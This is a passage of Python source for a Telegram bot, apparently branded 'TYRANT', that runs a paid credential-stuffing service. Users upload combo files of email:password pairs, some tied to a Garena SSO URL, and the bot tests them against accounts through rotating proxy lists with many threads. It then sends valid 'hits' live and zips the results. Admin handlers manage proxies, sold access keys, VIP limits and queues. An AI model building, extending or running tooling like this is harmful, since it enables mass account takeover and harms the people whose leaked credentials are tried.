                        tp4+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
                except: pass
            await _adm_edit(query,
                f" <b>Proxy</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"Files: <code>{len(pf4)}</code>  ·  Proxies: <code>{tp4:,}</code>",
                _admin_proxy_kb())
            return

        if data=="adm_proxy_upload":
            await query.answer("/upload_proxy — send a .txt file after", show_alert=True)
            uid5=str(tg.id)
            with sessions_lock: active_sessions.setdefault(uid5,{}); active_sessions[uid5]["awaiting_proxy"]=True
            await context.bot.send_message(chat_id=query.message.chat_id,
                text=" <b>Upload Proxy File</b>\nSend your <code>.txt</code> proxy file now.",
                parse_mode=ParseMode.HTML)
            return

        if data=="adm_proxy_paste":
            uid5=str(tg.id)
            with sessions_lock: active_sessions.setdefault(uid5,{}); active_sessions[uid5]["awaiting_proxy_paste"]=True
            await query.edit_message_text(
                " <b>Paste Proxies</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                "Paste your proxy lines now (one per line).\n<code>host:port</code> or <code>host:port:user:pass</code>",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_proxy_status":
            pf6=sorted(PROXY_DIR.glob("*.txt"))
            if not pf6:
                await query.edit_message_text(" No proxy files.",reply_markup=InlineKeyboardMarkup(BACK),parse_mode=ParseMode.HTML); return
            lines6=[" <b>Proxy Files</b>\n━━━━━━━━━━━━━━━━━━━━"]
            tot6=0
            for p6 in pf6:
                try:
                    with open(p6,"r",encoding="utf-8",errors="ignore") as f6:
                        cnt6=sum(1 for ln in f6 if ln.strip() and not ln.strip().startswith("#"))
                    sz6=p6.stat().st_size; ss6=f"{sz6/1024:.1f}KB" if sz6<1024*1024 else f"{sz6/1024/1024:.1f}MB"
                    tot6+=cnt6; lines6.append(f" <code>{p6.name}</code>  {cnt6:,}  {ss6}")
                except: lines6.append(f" <code>{p6.name}</code>  ")
            lines6.append(f"━━━━━━━━━━━━━━━━━━━━\n Total: <code>{tot6:,}</code>")
            await query.edit_message_text("\n".join(lines6),reply_markup=InlineKeyboardMarkup(BACK),parse_mode=ParseMode.HTML)
            return

        if data=="adm_proxy_remove":
            pf7=sorted(PROXY_DIR.glob("*.txt"))
            if not pf7:
                await query.edit_message_text(" No proxy files.",reply_markup=InlineKeyboardMarkup(BACK),parse_mode=ParseMode.HTML); return
            btns7=[[InlineKeyboardButton(f" {p7.name}",callback_data=f"delproxy_{p7.name}")] for p7 in pf7]
            btns7.append([InlineKeyboardButton(" Delete ALL",callback_data="delproxy_ALL")])
            btns7+=BACK
            await query.edit_message_text(" Tap file to delete:",reply_markup=InlineKeyboardMarkup(btns7),parse_mode=ParseMode.HTML)
            return

        # ── Settings sub-menu ─────────────────────────────────────────────
        if data=="adm_settings":
            cfg5=load_config()
            await _adm_edit(query,
                f" <b>Settings</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Threads    : <code>{cfg5.get('default_threads',5)}</code>\n"
                f" Concurrent : <code>{cfg5.get('max_concurrent',5)}</code>\n"
                f" Limit      : <code>{cfg5.get('global_limit') or 'Unlimited'}</code>\n"
                f" VIP Limit  : <code>{cfg5.get('vip_limit') or 'Unlimited'}</code>\n"
                f" Cooldown   : <code>{'Off' if not cfg5.get('cooldown_sessions') else str(cfg5['cooldown_sessions'])+'s→'+str(cfg5.get('cooldown_minutes',30))+'m'}</code>",
                _admin_settings_kb(cfg5))
            return

        if data in ("adm_info_threads","adm_info_cd","adm_info_limit","adm_info_viplimit","adm_info_concurrent"):
            hints={"adm_info_threads":"/setthreads <n>  (default threads per checker)",
                   "adm_info_cd":"/setcd <sessions> <minutes>  or  /setcd off",
                   "adm_info_limit":"/setlimit <n>  or  /setlimit off",
                   "adm_info_viplimit":"/setlimitforvip <n>  or  /setlimitforvip off",
                   "adm_info_concurrent":"/setconcurrent <n>  (1-50)"}
            await query.answer(hints.get(data,""), show_alert=True)
            return

        # ── Files sub-menu ────────────────────────────────────────────────
        if data=="adm_files":
            await _adm_edit(query,
                " <b>Files & Results</b>\n━━━━━━━━━━━━━━━━━━━━\nChoose action:",
                _admin_files_kb())
            return

        if data=="adm_files_clearcombo":
            count8=0
            for uid_dir8 in list(COMBO_DIR.iterdir()):
                if uid_dir8.is_dir():
                    for f8 in uid_dir8.glob("*.txt"):
                        try: f8.unlink(); count8+=1
                        except: pass
                    uid8=uid_dir8.name; clear_persisted_session(uid8)
                    with sessions_lock:
                        if uid8 in active_sessions and active_sessions[uid8].get("status") not in ("checking",):
                            del active_sessions[uid8]
                    # Remove uid subfolder if now empty
                    try:
                        if uid_dir8.exists() and not any(uid_dir8.iterdir()):
                            uid_dir8.rmdir()
                    except: pass
            await query.answer(f" Deleted {count8} combo file(s)")
            await query.edit_message_text(f" <b>Combo Cleared</b>\nDeleted <code>{count8}</code> file(s).",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_files_clearresults":
            import shutil; dirs8=0
            for uid_dir8 in RESULTS_DIR.iterdir():
                if uid_dir8.is_dir():
                    try: shutil.rmtree(uid_dir8); dirs8+=1
                    except: pass
            await query.answer(f" Cleared {dirs8} user(s) results")
            await query.edit_message_text(f" <b>Results Cleared</b>\nDeleted results for <code>{dirs8}</code> user(s).",
                reply_markup=InlineKeyboardMarkup(BACK), parse_mode=ParseMode.HTML)
            return

        if data=="adm_files_sendall":
            await query.answer(" Sending all results…")
            dirs9=[d for d in RESULTS_DIR.iterdir() if d.is_dir()]
            if not dirs9:
                await context.bot.send_message(chat_id=query.message.chat_id,text=" No results found."); return
            users9=load_users()
            for uid_dir9 in sorted(dirs9,key=lambda x:x.name):
                zips9=sorted(uid_dir9.rglob("*.zip"),key=lambda x:x.stat().st_mtime,reverse=True)
                if not zips9: continue
                uname9=users9.get(uid_dir9.name,{}).get("username","?")
                try:
                    with open(zips9[0],"rb") as f9:
                        await context.bot.send_document(chat_id=query.message.chat_id,document=f9,
                            filename=zips9[0].name,caption=f" {uid_dir9.name} @{uname9}")
                except: pass
            return

        # ── Keys helper callbacks ─────────────────────────────────────────
        if data in ("adm_genkey_hours","adm_genkey_days","adm_genkey_months","adm_genkey_lifetime"):
            dtype=data.split("_")[2]
            defaults={"hours":(24,1),"days":(7,1),"months":(1,1),"lifetime":(0,1)}
            dval,mu=defaults[dtype]
            exp=compute_expiry(dtype,dval)
            import uuid as _uuid2
            key=f"TYRANT-{_uuid2.uuid4().hex[:8].upper()}-{_uuid2.uuid4().hex[:4].upper()}"
            dd={"hours":f"{dval}h","days":f"{dval}d","months":f"{dval}mo","lifetime":"Lifetime"}[dtype]
            keys_db=load_keys()
            keys_db[key]={"max_users":mu,"used_by":[],"duration_type":dtype,"duration_val":dval,
                          "expires_at":exp,"created_at":datetime.now().isoformat(),"created_by":tg.id}
            save_keys(keys_db)
            await query.answer(" Key generated!")
            await _adm_edit(query,
                f" <b>Key Generated!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{key}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Duration : <b>{dd}</b>\n"
                f" Expires  : {fmt_expiry(exp)}\n"
                f" Max users: <code>{mu}</code>",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_keys")]]))
            return

        if data in ("adm_rmkey_all","adm_rmkey_vip","adm_rmkey_nonvip"):
            mode=data.split("_")[2]
            users_db2=load_users(); cnt=0
            for uid2 in list(users_db2.keys()):
                u2=users_db2[uid2]; iv=u2.get("vip",False); ia=u2.get("activated",False)
                match=(mode=="all" and ia) or (mode=="vip" and ia and iv) or (mode=="nonvip" and ia and not iv)
                if match:
                    users_db2[uid2].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); cnt+=1
                    with sessions_lock:
                        if uid2 in active_sessions: active_sessions[uid2].get("stop_event",threading.Event()).set()
                    try: await context.bot.send_message(chat_id=int(uid2),text=" <b>Access Revoked</b>\n\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
                    except: pass
            save_users(users_db2)
            label={"all":"All","vip":"VIP","nonvip":"Non-VIP"}[mode]
            await query.answer(f" {cnt} keys removed")
            await _adm_edit(query,
                f" <b>Keys Removed ({label})</b>\n<code>{cnt}</code> user(s) revoked.",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_keys")]]))
            return

        # ── Users helper callbacks ────────────────────────────────────────
        if data in ("adm_ask_addvip","adm_ask_rmvip","adm_ask_ban","adm_ask_unban","adm_ask_broadcast"):
            hints2={"adm_ask_addvip":"/addvip <user_id>","adm_ask_rmvip":"/removevip <user_id>",
                    "adm_ask_ban":"/ban_user <user_id>","adm_ask_unban":"/unban_user <user_id>",
                    "adm_ask_broadcast":"/broadcast <message>"}
            await query.answer(hints2.get(data,""), show_alert=True)
            return

        # ── Proxy helper callbacks ────────────────────────────────────────
        if data=="adm_upload_proxy":
            uid_a=str(tg.id)
            with sessions_lock: active_sessions.setdefault(uid_a,{}); active_sessions[uid_a]["awaiting_proxy"]=True
            await _adm_edit(query," <b>Upload Proxy</b>\nSend your <code>.txt</code> proxy file now.",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_proxy")]]))
            return

        if data=="adm_paste_proxy":
            uid_a=str(tg.id)
            with sessions_lock: active_sessions.setdefault(uid_a,{}); active_sessions[uid_a]["awaiting_proxy_paste"]=True
            await _adm_edit(query,
                " <b>Paste Proxies</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                "Paste your proxy lines now (one per line).\n<code>host:port</code> or <code>host:port:user:pass</code>",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_proxy")]]))
            return

        if data=="adm_reload_proxy":
            try:
                import dec_tyrantv12 as _dty3; _dty3.geo_rotator.__init__()
                tot_p=_dty3.geo_rotator.total
            except Exception as e: tot_p=f"err:{e}"
            await query.answer(f" Reloaded — {tot_p} proxies")
            pf_r=sorted(PROXY_DIR.glob("*.txt")); tp_r=0
            for p_r in pf_r:
                try:
                    with open(p_r,"r",encoding="utf-8",errors="ignore") as fh:
                        tp_r+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
                except: pass
            await _adm_edit(query,
                f" <b>Proxy</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"Files: <code>{len(pf_r)}</code>  ·  Proxies: <code>{tp_r:,}</code>\n Rotator reloaded!",
                _admin_proxy_kb())
            return

        if data=="adm_remove_proxy":
            pf_d=sorted(PROXY_DIR.glob("*.txt"))
            if not pf_d:
                await query.answer(" No proxy files.",show_alert=True); return
            btns_d=[[InlineKeyboardButton(f" {p.name}",callback_data=f"delproxy_{p.name}")] for p in pf_d]
            btns_d.append([InlineKeyboardButton(" Delete ALL",callback_data="delproxy_ALL")])
            btns_d.append([InlineKeyboardButton("« Back",callback_data="adm_proxy")])
            await _adm_edit(query," Tap file to delete:",InlineKeyboardMarkup(btns_d))
            return

        # ── Settings helper callbacks ─────────────────────────────────────
        if data=="adm_do_refresh":
            cfg_r=load_config()
            saved_mc=cfg_r.get("max_concurrent",5)
            if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
            try:
                import dec_tyrantv12 as _dty4; _dty4.geo_rotator.__init__()
            except: pass
            await query.answer(" Config reloaded!")
            await _adm_edit(query,
                f" <b>Settings</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" Threads    : <code>{cfg_r.get('default_threads',5)}</code>\n"
                f" Concurrent : <code>{cfg_r.get('max_concurrent',5)}</code>\n"
                f" Limit      : <code>{cfg_r.get('global_limit') or 'Unlimited'}</code>\n"
                f" VIP Limit  : <code>{cfg_r.get('vip_limit') or 'Unlimited'}</code>\n"
                f" Config refreshed!",
                _admin_settings_kb(cfg_r))
            return

        if data in ("adm_ask_limit","adm_ask_viplimit","adm_ask_cooldown","adm_ask_threads","adm_ask_concurrent"):
            hints3={"adm_ask_limit":"/setlimit <n>  or  /setlimit off",
                    "adm_ask_viplimit":"/setlimitforvip <n>  or  /setlimitforvip off",
                    "adm_ask_cooldown":"/setcd <sessions> <minutes>  or  /setcd off",
                    "adm_ask_threads":"/setthreads <n>  (default threads per session)",
                    "adm_ask_concurrent":"/setconcurrent <n>  (1-50 simultaneous sessions)"}
            await query.answer(hints3.get(data,""), show_alert=True)
            return

        # ── Files helper callbacks ────────────────────────────────────────


        if data=="adm_ask_refreshcombo":
            count_c=0
            for uid_c in list(COMBO_DIR.iterdir()):
                if uid_c.is_dir():
                    for f_c in uid_c.glob("*.txt"):
                        try: f_c.unlink(); count_c+=1
                        except: pass
                    clear_persisted_session(uid_c.name)
                    with sessions_lock:
                        if uid_c.name in active_sessions and active_sessions[uid_c.name].get("status")!="checking":
                            del active_sessions[uid_c.name]
                    # Remove uid subfolder if now empty
                    try:
                        if uid_c.exists() and not any(uid_c.iterdir()): uid_c.rmdir()
                    except: pass
            await query.answer(f" Deleted {count_c} combo file(s)")
            await _adm_edit(query,f" <b>Combo Cleared</b>\nDeleted <code>{count_c}</code> file(s).",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_files")]]))
            return

        if data=="adm_ask_refreshresults":
            import shutil; dirs_r2=0
            for uid_r2 in RESULTS_DIR.iterdir():
                if uid_r2.is_dir():
                    try: shutil.rmtree(uid_r2); dirs_r2+=1
                    except: pass
            await query.answer(f" Cleared {dirs_r2} user(s)")
            await _adm_edit(query,f" <b>Results Cleared</b>\nDeleted results for <code>{dirs_r2}</code> user(s).",
                InlineKeyboardMarkup([[InlineKeyboardButton("« Back",callback_data="adm_files")]]))
            return



        return

    # ── User deletes their own combo file ────────────────────────────────
    if data=="user_delete_file":
        with sessions_lock: s2=active_sessions.get(uid,{})
        if s2.get("status")=="checking":
            await query.answer(" Still checking! Use /stop first.",show_alert=True); return
        uc2=COMBO_DIR/uid
        existing2=list(uc2.glob("*.txt")) if uc2.exists() else []
        cur_file2=s2.get("file","")
        deleted2=[]
        for f in existing2:
            try: f.unlink(); deleted2.append(f.name)
            except: pass
        if cur_file2:
            try:
                fp2=Path(cur_file2)
                if fp2.exists(): fp2.unlink()
                if fp2.name not in deleted2: deleted2.append(fp2.name)
            except: pass
        # Remove combo/{uid}/ folder if now empty
        if uc2.exists():
            try:
                if not any(uc2.iterdir()): uc2.rmdir()
            except: pass
        clear_persisted_session(uid)
        with sessions_lock:
            if uid in active_sessions: del active_sessions[uid]
        names2=", ".join(f"<code>{n}</code>" for n in deleted2) if deleted2 else "your file"
        await query.edit_message_text(
            f" <b>File Deleted!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Deleted: {names2}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"You can now upload a new file via /start.",
            parse_mode=ParseMode.HTML)
        return

    # ── Resume after restart ─────────────────────────────────────────────
    if data.startswith("resume_check_"):
        target_uid = data[len("resume_check_"):]
        # Only the owner of that session can resume it
        if uid != target_uid:
            await query.answer(" Not your session.",show_alert=True); return
        with sessions_lock: s2=active_sessions.get(uid)
        if not s2 or not s2.get("file"):
            await query.answer(" Session expired. Use /start.",show_alert=True); return
        if not Path(s2["file"]).exists():
            await query.answer(" File missing. Upload again via /start.",show_alert=True)
            clear_persisted_session(uid)
            with sessions_lock: active_sessions.pop(uid,None)
            return
        if s2.get("status")=="checking":
            await query.answer(" Already checking!",show_alert=True); return
        # Patch stop_event in case it was set during crash
        with sessions_lock:
            active_sessions[uid]["stop_event"]=threading.Event()
            active_sessions[uid]["status"]="file_received"
        await query.edit_message_text(
            f" <b>Session Restored!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" File: <code>{Path(s2['file']).name}</code>\n"
            f" Configure or start below:",
            reply_markup=kb_settings(uid), parse_mode=ParseMode.HTML)
        return

    if data.startswith("cancel_resume_"):
        target_uid = data[len("cancel_resume_"):]
        if uid != target_uid:
            await query.answer(" Not your session.",show_alert=True); return
        with sessions_lock: s2=active_sessions.get(uid,{})
        fpath=s2.get("file")
        if fpath: del_combo(fpath)
        clear_persisted_session(uid)
        with sessions_lock: active_sessions.pop(uid,None)
        await query.edit_message_text(
            " <b>Session cancelled.</b>\nYour file has been deleted.\nUse /start to begin a new session.",
            parse_mode=ParseMode.HTML)
        return

    # proxy delete buttons
    if data.startswith("delproxy_") or data=="delproxy_ALL":
        if not is_admin(tg.id,cfg): await query.answer(" Admin only.",show_alert=True); return
        if data=="delproxy_ALL":
            cnt=0
            for pf in list(PROXY_DIR.glob("*.txt")):
                try: pf.unlink(); cnt+=1
                except: pass
            await query.edit_message_text(f" <b>Deleted all {cnt} proxy file(s).</b>\n Proxy folder is now empty.",parse_mode=ParseMode.HTML)
            return
        fname=data[len("delproxy_"):]; fpath=PROXY_DIR/fname
        if not fpath.exists(): await query.answer(" File not found.",show_alert=True); return
        try:
            fpath.unlink()
            rem=sorted(PROXY_DIR.glob("*.txt"))
            if not rem:
                await query.edit_message_text(" <b>Deleted!</b>\n No more proxy files.",parse_mode=ParseMode.HTML); return
            lines=[" <b>Proxy Files</b> — tap to delete:\n━━━━━━━━━━━━━━━━━━━━"]
            btns=[]
            for pf in rem:
                try:
                    with open(pf,"r",encoding="utf-8",errors="ignore") as rf:
                        cnt=sum(1 for ln in rf if ln.strip() and not ln.strip().startswith("#"))
                    sz=pf.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
                    lines.append(f" <code>{pf.name}</code>  ({cnt:,} proxies · {ss})")
                except: lines.append(f" <code>{pf.name}</code>   unreadable")
                btns.append([InlineKeyboardButton(f" Delete  {pf.name}",callback_data=f"delproxy_{pf.name}")])
            btns.append([InlineKeyboardButton(" Delete ALL proxy files",callback_data="delproxy_ALL")])
            lines.append(f"━━━━━━━━━━━━━━━━━━━━\nTotal: <code>{len(rem)}</code> file(s)")
            await query.edit_message_text("\n".join(lines),reply_markup=InlineKeyboardMarkup(btns),parse_mode=ParseMode.HTML)
        except Exception as e: await query.answer(f" {e}",show_alert=True)
        return

    # all others need gate
    allowed,ud,users=await gate_cb(query,context)
    if not allowed: return

    if data=="start_check":
        with sessions_lock: ex=active_sessions.get(uid)
        if ex and ex.get("status")=="checking":
            await query.edit_message_text(" Already have an active session!\nUse /stop first.",parse_mode=ParseMode.HTML); return
        with sessions_lock:
            active_sessions[uid]={"status":"waiting_file","file":None,"stop_event":threading.Event(),
                                   "lvl_key":"lvl_all","cf_key":"cf_both","chat_id":query.message.chat_id}
        m=await query.edit_message_text(
            " <b>Send Your Combo File</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            " Send a <code>.txt</code> file. Supported formats:\n"
            "<code>email:password</code>\n"
            "<code>user:pass</code>\n"
            "<code>https://sso.garena.com/ui/register:user:pass</code>\n"
            "━━━━━━━━━━━━━━━━━━━━\n Waiting for your file…",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(" I haven't sent it yet",callback_data="remind_file")]]),
            parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)

    elif data=="remind_file":
        with sessions_lock: s=active_sessions.get(uid)
        if not s or not s.get("file"): await query.answer(" You haven't sent any files yet! Please send your files first.",show_alert=True)
        else: await query.answer(" File already received!",show_alert=True)

    elif data=="open_level_menu":
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
        await query.edit_message_text(" <b>Choose Level Threshold</b>\n\nHits at or above this level sent live:",reply_markup=kb_level(),parse_mode=ParseMode.HTML)

    elif data=="open_filter_menu":
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
        await query.edit_message_text(" <b>Choose Hit Filter</b>\n\nWhich accounts sent to you?",reply_markup=kb_filter(),parse_mode=ParseMode.HTML)

    elif data.startswith("set_lvl_"):
        k=data[8:]
        if k not in LEVEL_OPTIONS: await query.answer("Invalid.",show_alert=True); return
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
            active_sessions[uid]["lvl_key"]=k
            s2=active_sessions[uid]
        # Update persisted session so restart recovers the new setting
        ps2=load_persisted_sessions()
        if uid in ps2: ps2[uid]["lvl_key"]=k; persist_session(uid,ps2[uid])
        await query.edit_message_text(f" Level: <b>{LEVEL_OPTIONS[k]['label']}</b>\n\nConfigure or start:",reply_markup=kb_settings(uid),parse_mode=ParseMode.HTML)

    elif data.startswith("set_cf_"):
        k=data[7:]
        if k not in CLEAN_OPTIONS: await query.answer("Invalid.",show_alert=True); return
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
            active_sessions[uid]["cf_key"]=k
        # Update persisted session so restart recovers the new setting
        ps2=load_persisted_sessions()
        if uid in ps2: ps2[uid]["cf_key"]=k; persist_session(uid,ps2[uid])
        await query.edit_message_text(f" Filter: <b>{CLEAN_OPTIONS[k]['label']}</b>\n\nConfigure or start:",reply_markup=kb_settings(uid),parse_mode=ParseMode.HTML)

    elif data=="back_to_settings":
        with sessions_lock:
            if uid not in active_sessions: await query.answer("Session expired.",show_alert=True); return
            s=active_sessions[uid]
        fn=Path(s["file"]).name if s.get("file") else "N/A"
        await query.edit_message_text(f" <b>Settings</b>\n File: <code>{fn}</code>\nConfigure below:",reply_markup=kb_settings(uid),parse_mode=ParseMode.HTML)

    elif data=="do_start_check":
        with sessions_lock: s=active_sessions.get(uid)
        if not s: await query.answer("Session expired.",show_alert=True); return
        if not s.get("file"): await query.answer(" No file received yet! Send your .txt file first.",show_alert=True); return
        if s.get("status")=="checking": await query.answer(" Already checking! Use /stop first.",show_alert=True); return

        cfg2=load_config()
        on_cd,ml=check_cooldown(uid,cfg2)
        if on_cd and not is_admin(tg.id,cfg2):
            h,m_=int(ml//60),int(ml%60)
            ts_="{}h {}m".format(h,m_) if h else "{}m".format(m_)
            await query.answer(f" Cooldown! Wait {ts_}.",show_alert=True); return

        combo=Path(s["file"]); stop_ev=s["stop_event"]
        lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
        thr=LEVEL_OPTIONS[lk]["threshold"]; clf=CLEAN_OPTIONS[ck]["filter"]
        cid=s.get("chat_id",query.message.chat_id); ll=LEVEL_OPTIONS[lk]["label"]; cl=CLEAN_OPTIONS[ck]["label"]
        ts=datetime.now().strftime("%Y%m%d_%H%M%S"); rf=RESULTS_DIR/uid/ts; rf.mkdir(parents=True,exist_ok=True)
        udb=load_users(); isv=udb.get(uid,{}).get("vip",False) or is_admin(tg.id,cfg2)
        # Per-user custom_limit overrides global limit
        custom_lim=udb.get(uid,{}).get("custom_limit")
        lim=custom_lim or (cfg2.get("vip_limit") if isv else cfg2.get("global_limit"))
        threads=cfg2.get("default_threads",5)
        _hits_on = udb.get(uid,{}).get("hits_notif", False)
        btok=cfg2["bot_token"] if _hits_on else None
        try:
            with open(combo,"r",encoding="utf-8",errors="ignore") as f: total_lines=sum(1 for ln in f if ln.strip() and ":" in ln)
        except: total_lines=0
        disp=min(lim,total_lines) if lim else total_lines
        # Apply global max_lines_per_check cap (hard ceiling per session)
        ml_cap=cfg2.get("max_lines_per_check")
        if ml_cap: disp=min(disp,ml_cap)

        with sessions_lock:
            active_sessions[uid]["status"]="checking"
            active_sessions[uid]["result_folder"]=str(rf)
            active_sessions[uid]["orig_total"]=disp

        _hits_label = f"{pe(3)} 🔔 Live Hits: ON" if _hits_on else f"{pe(1)} 🔕 Live Hits: OFF — /hitson para i-enable"
        smsg=await query.edit_message_text(
            f"{pe(5)} <b>CHECKER LAUNCHED!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} <b>SESSION INFO</b> {pe(2)}\n"
            f"{pe_thin()}\n"
            f"{pe(2)} Lines   : <b><code>{disp:,}</code></b>\n"
            f"{pe(1)} Threads : <code>{threads}</code>\n"
            f"{pe(2)} Level   : <b>{ll}</b>\n"
            f"{pe(2)} Filter  : <b>{cl}</b>\n"
            f"{pe_sep()}\n"
            f"{_hits_label}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} /check — live stats\n"
            f"{pe(1)} /stop  — stop & get results",
            parse_mode=ParseMode.HTML)
        if smsg: track(uid,smsg.message_id)
        loop=asyncio.get_event_loop()

        # ── Persist session for crash-resume ──────────────────────
        persist_session(uid, {
            "file": str(combo), "chat_id": cid,
            "lvl_key": lk, "cf_key": ck,
            "status_msg_id": smsg.message_id if smsg else None,
            "username": tg.username or "",
            "first_name": tg.first_name or "",
            "status": "checking",
            "result_folder": str(rf),   # ← save so resume reuses same folder
            "orig_total": disp,         # ← save so progress % is correct after restart
        })

        # ── 3-minute live status updater + auto zip sender ──────
        _status_stop = threading.Event()
        _auto_part   = [1]   # part counter for auto-sends

        def _status_loop():
            while not _status_stop.wait(180):
                with sessions_lock: s2 = active_sessions.get(uid, {})
                if s2.get("status") != "checking": break

                # ── Update stats card ─────────────────────────────────
                ls2 = s2.get("live_stats")
                if ls2 is not None:
                    cur_stats = ls2.get_stats()
                    # ── Persist stats snapshot for crash recovery ─────
                    update_persisted_stats(uid, cur_stats)
                    # Use LiveStats.total as accurate processed counter
                    done_count = cur_stats.get("total", 0)
                    if disp and done_count > disp: done_count = disp
                    card = stats_card(done_count, disp, cur_stats, ll, cl,
                                       result_folder=str(rf))
                    try:
                        asyncio.run_coroutine_threadsafe(
                            context.bot.edit_message_text(
                                chat_id=cid, message_id=smsg.message_id,
                                text=card, parse_mode=ParseMode.HTML), loop)
                    except: pass

                # ── Auto-send partial zip when results near 49 MB ─────
                try:
                    cur_rf = Path(s2.get("result_folder", str(rf)))
                    result_files = [f for f in cur_rf.rglob("*")
                                    if f.is_file() and not f.name.endswith(".zip")]
                    folder_size  = sum(f.stat().st_size for f in result_files)
                    if folder_size >= int(TG_MAX_BYTES * 0.85):
                        pzip = cur_rf / f"results_{uid}_{ts}_auto{_auto_part[0]}.zip"
                        with zipfile.ZipFile(pzip, "w", zipfile.ZIP_DEFLATED) as zf:
                            for f in result_files: zf.write(f, f.relative_to(cur_rf))
                        ls3  = s2.get("live_stats")
                        snap = ls3.get_stats() if ls3 else {}
                        asyncio.run_coroutine_threadsafe(
                            deliver_results(context.bot, cid, uid, [pzip], snap,
                                            combo_file=None, partial=True), loop)
                        # Delete sent source files so new hits go to a fresh batch
                        for f in result_files:
                            try: f.unlink()
                            except: pass
                        _auto_part[0] += 1
                except: pass

        threading.Thread(target=_status_loop, daemon=True, name=f"status-{uid}").start()

        def bg():
            _enqueue(uid)
            pos=_queue_pos(uid)
            if pos>1:
                asyncio.run_coroutine_threadsafe(context.bot.send_message(chat_id=cid,
                    text=f" <b>Queue Position: #{pos}</b>\nWaiting for a free slot…\nUse /stop to cancel.",
                    parse_mode=ParseMode.HTML),loop)
            _checker_semaphore.acquire(); _dequeue(uid)
            with sessions_lock:
                if active_sessions.get(uid,{}).get("status")!="checking" or stop_ev.is_set():
                    _checker_semaphore.release(); _status_stop.set(); return
            try:
                asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(
                    chat_id=cid,message_id=smsg.message_id,
                    text=(f" <b>Checker Running!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                          f" Lines   : <code>{disp:,}</code>\n Threads : <code>{threads}</code>\n"
                          f" Level   : <b>{ll}</b>\n Filter  : <b>{cl}</b>\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n Hits sent here live!\n /check   /stop"),
                    parse_mode=ParseMode.HTML),loop)
            except: pass
            try:
                # ── Guard: checker module must be available ───────────────
                if not CHECKER_OK:
                    asyncio.run_coroutine_threadsafe(
                        context.bot.send_message(
                            chat_id=cid,
                            text=(f" <b>Checker Unavailable</b>\n"
                                  f"━━━━━━━━━━━━━━━━━━━━\n"
                                  f"The checker module failed to load.\n"
                                  f"<code>{CHECKER_ERR[:300]}</code>\n\n"
                                  f"Contact admin to fix the deployment."),
                            parse_mode=ParseMode.HTML), loop)
                    return
                st=run_checker(uid,combo,rf,lim,threads,stop_ev,btok,cid,thr,clf)
                # ── If checker returned an error, show it and stop ────────
                if st.get("error"):
                    asyncio.run_coroutine_threadsafe(
                        context.bot.send_message(
                            chat_id=cid,
                            text=(f" <b>Checker Error</b>\n"
                                  f"━━━━━━━━━━━━━━━━━━━━\n"
                                  f"<code>{st['error'][:400]}</code>"),
                            parse_mode=ParseMode.HTML), loop)
                    return
                u2=load_users()
                if uid in u2:
                    u2[uid]["total_checked"]+=st.get("total",0)
                    u2[uid]["sessions_count"]+=1; save_users(u2)
                zo=rf/f"results_{uid}_{ts}.zip"; zp=zip_results(rf,zo)
                # Check if stopped mid-way AND user chose "continue" (stop_continue flag)
                with sessions_lock: s2=active_sessions.get(uid,{})
                is_continuing=s2.get("stop_continue",False)
                if is_continuing:
                    # Send partial results but keep combo file alive
                    asyncio.run_coroutine_threadsafe(
                        deliver_results(context.bot,cid,uid,zp,st,combo_file=None,partial=True),loop)
                    # Reset stop event and re-launch checker for remaining lines
                    new_stop=threading.Event()
                    with sessions_lock:
                        if uid in active_sessions:
                            active_sessions[uid]["stop_event"]=new_stop
                            active_sessions[uid]["stop_continue"]=False
                            active_sessions[uid]["status"]="checking"
                    _checker_semaphore.release()
                    _status_stop.set()
                    # Launch new bg thread for remaining lines
                    new_ts=datetime.now().strftime("%Y%m%d_%H%M%S")
                    new_rf=RESULTS_DIR/uid/new_ts; new_rf.mkdir(parents=True,exist_ok=True)
                    with sessions_lock:
                        if uid in active_sessions:
                            active_sessions[uid]["result_folder"]=str(new_rf)
                    def _continue_bg():
                        _enqueue(uid)
                        _checker_semaphore.acquire(); _dequeue(uid)
                        try:
                            st2=run_checker(uid,combo,new_rf,lim,threads,new_stop,btok,cid,thr,clf,is_resume=True)
                            u3=load_users()
                            if uid in u3:
